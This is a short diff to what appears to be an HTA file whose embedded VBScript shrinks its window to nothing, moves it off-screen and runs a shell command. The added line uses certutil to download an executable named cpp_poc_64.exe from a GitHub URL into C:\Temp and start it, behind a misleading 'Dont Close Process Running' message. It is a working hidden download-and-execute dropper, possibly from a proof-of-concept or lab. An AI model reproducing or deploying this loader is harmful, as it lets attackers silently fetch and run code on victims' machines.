@@ -5,7 +5,7 @@
 Window.ReSizeTo 0, 0
 Window.moveTo -2000,-2000
 Set objShell = CreateObject("Wscript.Shell")
-objShell.Run "cmd /c cd C:\ & cpp_poc_64.exe"
+objShell.Run "cmd /c echo Dont Close Process Running & certutil.exe -urlcache -split -f https://github.com/void010/dummy/raw/main/cpp_poc_64.exe C:\\Temp\\poc.exe & start C:\\Temp\\poc.exe"
 self.close
 </script>
 <body>
